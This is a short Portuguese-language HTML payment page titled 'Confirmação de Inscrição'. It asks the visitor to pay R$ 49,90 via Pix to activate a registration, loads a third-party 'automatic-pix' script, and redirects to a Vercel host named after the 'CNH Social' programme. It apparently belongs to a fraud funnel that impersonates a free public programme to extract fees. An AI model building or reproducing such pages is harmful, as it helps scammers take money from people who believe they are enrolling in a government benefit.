<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmação de Inscrição</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts - Inter -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background-color: #ffffff;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            padding: 32px;
            max-width: 600px;
            width: 100%;
            text-align: center;
        }
        /* Custom alert/modal styling */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background-color: white;
            padding: 24px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        .modal-content button {
            margin-top: 16px;
            padding: 8px 16px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Aqui vai o conteúdo do Pix -->
        <h2 class="text-2xl font-bold text-gray-800 mb-6">Confirmação de Inscrição</h2>
        <p class="text-gray-600 mb-4 leading-relaxed">
            Para ativar sua inscrição, realize o pagamento via Pix no valor de <span class="font-bold text-blue-600">R$ 49,90</span>.
        </p>
        <div class="flex flex-col items-center p-6 bg-gray-50 rounded-lg shadow-inner mb-6">
            <div id="automatic-pix-container" class="w-full">
                <!-- O script do Pix será inserido aqui -->
            </div>
            <p class="text-gray-600 mt-4 leading-relaxed">
                Aguardando a confirmação do pagamento...
            </p>
        </div>
    </div>

    <!-- Container for custom modal -->
    <div id="modalContainer"></div>

    <!-- Script do Pix fornecido pelo usuário -->
    <script src="https://compre-safe.com/js/automatic-pix.js" data-code="vafxe4z5nyzj76" data-redirect="https://programacnhsocial-parte-2.vercel.app/" async></script>

    <script>
        // Custom alert function to avoid issues with iframes
        function customAlert(message) {
            const modalContainer = document.getElementById('modalContainer');
            modalContainer.innerHTML = `
                <div class="modal-overlay">
                    <div class="modal-content">
                        <p>${message}</p>
                        <button onclick="closeModal()">OK</button>
                    </div>
                </div>
            `;
        }

        function closeModal() {
            const modalContainer = document.getElementById('modalContainer');
            modalContainer.innerHTML = '';
        }

        // Lógica para obter dados do agendamento do localStorage (opcional, para uso futuro)
        const agendamento = JSON.parse(localStorage.getItem('agendamento'));
        if (agendamento) {
            console.log('Detalhes do agendamento:', agendamento);
        }
    </script>
</body>
</html>
